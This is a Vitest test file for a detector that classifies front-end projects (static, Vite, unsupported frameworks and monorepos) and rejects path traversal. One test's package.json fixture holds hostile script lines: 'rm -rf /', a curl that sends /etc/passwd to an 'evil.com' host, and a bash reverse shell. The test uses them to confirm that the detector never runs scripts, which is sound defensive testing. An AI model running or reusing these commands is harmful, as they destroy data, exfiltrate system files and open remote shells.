import { describe, it, expect, vi } from 'vitest';
import child_process from 'node:child_process';
import {
  detectFramework,
  mapDetectorResultToPrismaFramework,
  normalizeProjectRoot,
  DetectionReasonCode,
  MAX_PACKAGE_JSON_SIZE_BYTES,
} from '../src/modules/preview/detector.js';

describe('Passive Project Detection Engine (Milestone 4)', () => {
  // Test 1: Basic static website
  it('1. Detects basic static website with root index.html and no package.json', () => {
    const res = detectFramework({
      rootFiles: ['index.html', 'style.css', 'app.js', 'logo.svg'],
      packageJsonRaw: null,
    });

    expect(res.supported).toBe(true);
    expect(res.framework).toBe('STATIC');
    expect(res.variant).toBe('STATIC_HTML');
    expect(res.entryPoint).toBe('index.html');
    expect(mapDetectorResultToPrismaFramework(res)).toBe('STATIC');
  });

  // Test 2: Vite vanilla project
  it('2. Detects Vite vanilla project with package-lock.json', () => {
    const pkg = {
      name: 'vanilla-vite',
      devDependencies: {
        vite: '^5.4.14',
      },
    };

    const res = detectFramework({
      rootFiles: ['index.html', 'package.json', 'package-lock.json', 'main.js'],
      packageJsonRaw: JSON.stringify(pkg),
    });

    expect(res.supported).toBe(true);
    expect(res.framework).toBe('VITE_FRONTEND');
    expect(res.variant).toBe('VANILLA');
    expect(res.entryPoint).toBe('index.html');
    expect(res.packageManager).toBe('NPM');
    expect(mapDetectorResultToPrismaFramework(res)).toBe('VITE_VANILLA');
  });

  // Test 3: Vite React project
  it('3. Detects Vite React project with package-lock.json', () => {
    const pkg = {
      name: 'vite-react-app',
      dependencies: {
        react: '^18.3.1',
        'react-dom': '^18.3.1',
      },
      devDependencies: {
        '@vitejs/plugin-react': '^4.3.4',
        vite: '^5.4.14',
      },
    };

    const res = detectFramework({
      rootFiles: ['index.html', 'package.json', 'package-lock.json', 'src/App.jsx'],
      packageJsonRaw: JSON.stringify(pkg),
    });

    expect(res.supported).toBe(true);
    expect(res.framework).toBe('VITE_FRONTEND');
    expect(res.variant).toBe('REACT');
    expect(res.entryPoint).toBe('index.html');
    expect(res.packageManager).toBe('NPM');
    expect(mapDetectorResultToPrismaFramework(res)).toBe('VITE_REACT');
  });

  // Test 4: React without Vite
  it('4. Rejects React project without Vite', () => {
    const pkg = {
      dependencies: {
        react: '^18.0.0',
        'react-dom': '^18.0.0',
      },
    };

    const res = detectFramework({
      rootFiles: ['index.html', 'package.json', 'package-lock.json'],
      packageJsonRaw: JSON.stringify(pkg),
    });

    expect(res.supported).toBe(false);
    expect(res.framework).toBe('UNSUPPORTED');
    expect(res.reasonCode).toBe(DetectionReasonCode.REACT_WITHOUT_VITE);
    expect(res.message).toMatch(/React projects without Vite are not supported/);
    expect(mapDetectorResultToPrismaFramework(res)).toBe('UNKNOWN');
  });

  // Test 5: Create React App
  it('5. Rejects Create React App (react-scripts)', () => {
    const pkg = {
      dependencies: {
        react: '^18.2.0',
        'react-dom': '^18.2.0',
        'react-scripts': '5.0.1',
      },
    };

    const res = detectFramework({
      rootFiles: ['index.html', 'package.json', 'package-lock.json'],
      packageJsonRaw: JSON.stringify(pkg),
    });

    expect(res.supported).toBe(false);
    expect(res.framework).toBe('UNSUPPORTED');
    expect(res.reasonCode).toBe(DetectionReasonCode.CRA_UNSUPPORTED);
    expect(res.message).toMatch(/react-scripts/);
  });

  // Test 6: Next.js
  it('6. Rejects Next.js applications', () => {
    const pkg = {
      dependencies: {
        next: '^14.2.0',
        react: '^18.2.0',
      },
    };

    const res = detectFramework({
      rootFiles: ['index.html', 'package.json', 'package-lock.json'],
      packageJsonRaw: JSON.stringify(pkg),
    });

    expect(res.supported).toBe(false);
    expect(res.framework).toBe('UNSUPPORTED');
    expect(res.reasonCode).toBe(DetectionReasonCode.NEXTJS_UNSUPPORTED);
    expect(res.message).toMatch(/Next\.js/);
  });

  // Test 7: Express backend with index.html
  it('7. Rejects Express / backend applications even if root index.html is present', () => {
    const pkg = {
      dependencies: {
        express: '^4.19.2',
        dotenv: '^16.4.5',
      },
    };

    const res = detectFramework({
      rootFiles: ['index.html', 'package.json', 'package-lock.json', 'server.js'],
      packageJsonRaw: JSON.stringify(pkg),
    });

    expect(res.supported).toBe(false);
    expect(res.framework).toBe('UNSUPPORTED');
    expect(res.reasonCode).toBe(DetectionReasonCode.BACKEND_PROJECT_UNSUPPORTED);
    expect(res.message).toMatch(/Backend applications/);
  });

  // Test 8: Empty repository
  it('8. Rejects empty repository', () => {
    const res = detectFramework({
      rootFiles: [],
    });

    expect(res.supported).toBe(false);
    expect(res.framework).toBe('UNSUPPORTED');
    expect(res.reasonCode).toBe(DetectionReasonCode.EMPTY_REPOSITORY);
  });

  // Test 9: Missing index.html
  it('9. Rejects repository missing root index.html', () => {
    const pkg = {
      devDependencies: {
        vite: '^5.4.14',
      },
    };

    const res = detectFramework({
      rootFiles: ['package.json', 'package-lock.json', 'src/main.js'],
      packageJsonRaw: JSON.stringify(pkg),
    });

    expect(res.supported).toBe(false);
    expect(res.framework).toBe('UNSUPPORTED');
    expect(res.reasonCode).toBe(DetectionReasonCode.MISSING_INDEX_HTML);
  });

  // Test 10: Missing package.json with lockfile present
  it('10. Rejects repository with lockfile but missing package.json', () => {
    const res = detectFramework({
      rootFiles: ['index.html', 'package-lock.json'],
      packageJsonRaw: null,
    });

    expect(res.supported).toBe(false);
    expect(res.framework).toBe('UNSUPPORTED');
    expect(res.reasonCode).toBe(DetectionReasonCode.UNSUPPORTED_PROJECT_STRUCTURE);
  });

  // Test 11: Missing package-lock.json in Vite project
  it('11. Rejects Vite project with missing package-lock.json', () => {
    const pkg = {
      devDependencies: {
        vite: '^5.4.14',
      },
    };

    const res = detectFramework({
      rootFiles: ['index.html', 'package.json', 'main.js'],
      packageJsonRaw: JSON.stringify(pkg),
    });

    expect(res.supported).toBe(false);
    expect(res.framework).toBe('UNSUPPORTED');
    expect(res.reasonCode).toBe(DetectionReasonCode.LOCKFILE_REQUIRED);
    expect(res.message).toMatch(/package-lock\.json/);
  });

  // Test 12: Yarn-only project
  it('12. Rejects Yarn-only project with explicit reason', () => {
    const pkg = {
      devDependencies: {
        vite: '^5.4.14',
      },
    };

    const res = detectFramework({
      rootFiles: ['index.html', 'package.json', 'yarn.lock'],
      packageJsonRaw: JSON.stringify(pkg),
    });

    expect(res.supported).toBe(false);
    expect(res.framework).toBe('UNSUPPORTED');
    expect(res.reasonCode).toBe(DetectionReasonCode.LOCKFILE_UNSUPPORTED);
    expect(res.message).toMatch(/Yarn/);
  });

  // Test 13: pnpm-only project
  it('13. Rejects pnpm-only project with explicit reason', () => {
    const pkg = {
      devDependencies: {
        vite: '^5.4.14',
      },
    };

    const res = detectFramework({
      rootFiles: ['index.html', 'package.json', 'pnpm-lock.yaml'],
      packageJsonRaw: JSON.stringify(pkg),
    });

    expect(res.supported).toBe(false);
    expect(res.framework).toBe('UNSUPPORTED');
    expect(res.reasonCode).toBe(DetectionReasonCode.LOCKFILE_UNSUPPORTED);
    expect(res.message).toMatch(/pnpm/);
  });

  // Test 14: Malformed package.json
  it('14. Rejects malformed package.json syntax', () => {
    const res = detectFramework({
      rootFiles: ['index.html', 'package.json', 'package-lock.json'],
      packageJsonRaw: '{\n  "name": "broken",\n  dependencies: {', // syntax error
    });

    expect(res.supported).toBe(false);
    expect(res.framework).toBe('UNSUPPORTED');
    expect(res.reasonCode).toBe(DetectionReasonCode.PACKAGE_JSON_INVALID);
    expect(res.message).toMatch(/invalid JSON syntax/);
  });

  // Test 15: package.json exceeding 256 KB
  it('15. Rejects package.json exceeding 256 KB threshold', () => {
    const oversizedSize = MAX_PACKAGE_JSON_SIZE_BYTES + 1024; // 257 KB

    const res = detectFramework({
      rootFiles: ['index.html', 'package.json', 'package-lock.json'],
      packageJsonRaw: '{"name":"huge"}',
      packageJsonSize: oversizedSize,
    });

    expect(res.supported).toBe(false);
    expect(res.framework).toBe('UNSUPPORTED');
    expect(res.reasonCode).toBe(DetectionReasonCode.PACKAGE_JSON_OVERSIZED);
    expect(res.message).toMatch(/256 KB/);
  });

  // Test 16: Monorepo with npm workspaces
  it('16. Rejects monorepo configured with package.json workspaces', () => {
    const pkg = {
      name: 'monorepo-root',
      workspaces: ['packages/*', 'apps/*'],
      devDependencies: {
        vite: '^5.4.14',
      },
    };

    const res = detectFramework({
      rootFiles: ['index.html', 'package.json', 'package-lock.json'],
      packageJsonRaw: JSON.stringify(pkg),
    });

    expect(res.supported).toBe(false);
    expect(res.framework).toBe('UNSUPPORTED');
    expect(res.reasonCode).toBe(DetectionReasonCode.MONOREPO_UNSUPPORTED);
  });

  // Test 17: pnpm-workspace.yaml
  it('17. Rejects monorepo with pnpm-workspace.yaml or lerna.json at root', () => {
    const res = detectFramework({
      rootFiles: ['index.html', 'package.json', 'pnpm-workspace.yaml', 'package-lock.json'],
      packageJsonRaw: '{"name":"root"}',
    });

    expect(res.supported).toBe(false);
    expect(res.framework).toBe('UNSUPPORTED');
    expect(res.reasonCode).toBe(DetectionReasonCode.MONOREPO_UNSUPPORTED);
  });

  // Test 18: Malicious scripts inside package.json
  it('18. Strictly ignores scripts and never executes malicious payloads', () => {
    const execSpy = vi.spyOn(child_process, 'exec');
    const spawnSpy = vi.spyOn(child_process, 'spawn');

    const maliciousPkg = {
      name: 'malicious-repo',
      scripts: {
        postinstall: 'rm -rf /; curl http://malicious.evil.com/exfil?t=$(cat /etc/passwd)',
        preinstall: 'node -e "process.exit(1)"',
        dev: 'cat /dev/urandom',
        start: 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',
      },
      devDependencies: {
        vite: '^5.4.14',
      },
    };

    const res = detectFramework({
      rootFiles: ['index.html', 'package.json', 'package-lock.json'],
      packageJsonRaw: JSON.stringify(maliciousPkg),
    });

    // Verification: Child process execution was NEVER called
    expect(execSpy).not.toHaveBeenCalled();
    expect(spawnSpy).not.toHaveBeenCalled();

    // Detection output does NOT leak or contain any script text
    expect(JSON.stringify(res)).not.toContain('rm -rf');
    expect(JSON.stringify(res)).not.toContain('attacker');
    expect(JSON.stringify(res)).not.toContain('malicious');

    // Evaluated safely purely on dependencies
    expect(res.supported).toBe(true);
    expect(res.framework).toBe('VITE_FRONTEND');
    expect(res.variant).toBe('VANILLA');

    execSpy.mockRestore();
    spawnSpy.mockRestore();
  });

  // Test 19: Unknown dependencies without bundler
  it('19. Rejects unknown non-bundler dependencies without build tool', () => {
    const pkg = {
      dependencies: {
        lodash: '^4.17.21',
        axios: '^1.6.0',
      },
    };

    const res = detectFramework({
      rootFiles: ['index.html', 'package.json', 'package-lock.json'],
      packageJsonRaw: JSON.stringify(pkg),
    });

    expect(res.supported).toBe(false);
    expect(res.framework).toBe('UNSUPPORTED');
    expect(res.reasonCode).toBe(DetectionReasonCode.UNSUPPORTED_PROJECT_STRUCTURE);
  });

  // Test 20: Invalid metadata structures
  it('20. Safely handles invalid metadata structures and corrupt package roots', () => {
    // Null rootFiles
    expect(detectFramework({ rootFiles: null }).reasonCode).toBe(DetectionReasonCode.INVALID_METADATA);

    // Array root in package.json
    expect(
      detectFramework({
        rootFiles: ['index.html', 'package.json', 'package-lock.json'],
        packageJsonRaw: '["item1", "item2"]',
      }).reasonCode
    ).toBe(DetectionReasonCode.PACKAGE_JSON_INVALID);

    // String root in package.json
    expect(
      detectFramework({
        rootFiles: ['index.html', 'package.json', 'package-lock.json'],
        packageJsonRaw: '"just-a-string"',
      }).reasonCode
    ).toBe(DetectionReasonCode.PACKAGE_JSON_INVALID);
  });

  // Additional check: Unsupported bundlers (Webpack / Parcel)
  it('21. Rejects Webpack and Parcel bundlers', () => {
    const webpackPkg = {
      devDependencies: {
        webpack: '^5.90.0',
        'webpack-cli': '^5.1.0',
      },
    };

    const res = detectFramework({
      rootFiles: ['index.html', 'package.json', 'package-lock.json'],
      packageJsonRaw: JSON.stringify(webpackPkg),
    });

    expect(res.supported).toBe(false);
    expect(res.reasonCode).toBe(DetectionReasonCode.BUNDLER_UNSUPPORTED);
    expect(res.message).toMatch(/webpack/);
  });

  // Test 22: Preserves and normalizes projectRoot for nested applications
  it('22. Preserves and normalizes projectRoot for nested applications', () => {
    const pkg = {
      name: 'nested-vite-app',
      dependencies: { react: '^19.0.0' },
      devDependencies: { vite: '^5.4.14' },
    };

    const res = detectFramework({
      rootFiles: ['index.html', 'package.json', 'package-lock.json'],
      packageJsonRaw: JSON.stringify(pkg),
      projectRoot: 'vite-project',
    });

    expect(res.supported).toBe(true);
    expect(res.framework).toBe('VITE_FRONTEND');
    expect(res.variant).toBe('REACT');
    expect(res.projectRoot).toBe('vite-project');
  });

  // Test 23: Path traversal rejection in normalizeProjectRoot
  it('23. Path traversal rejection in normalizeProjectRoot', () => {
    expect(normalizeProjectRoot('')).toBe('');
    expect(normalizeProjectRoot(null)).toBe('');
    expect(normalizeProjectRoot('.')).toBe('');
    expect(normalizeProjectRoot('client')).toBe('client');
    expect(normalizeProjectRoot('apps/web')).toBe('apps/web');

    expect(() => normalizeProjectRoot('/absolute')).toThrowError(/path traversal or absolute path/);
    expect(() => normalizeProjectRoot('../outside')).toThrowError(/path traversal or absolute path/);
    expect(() => normalizeProjectRoot('a/../../b')).toThrowError(/path traversal or absolute path/);
    expect(() => normalizeProjectRoot('%2e%2e/test')).toThrowError(/path traversal or absolute path/);
  });
});
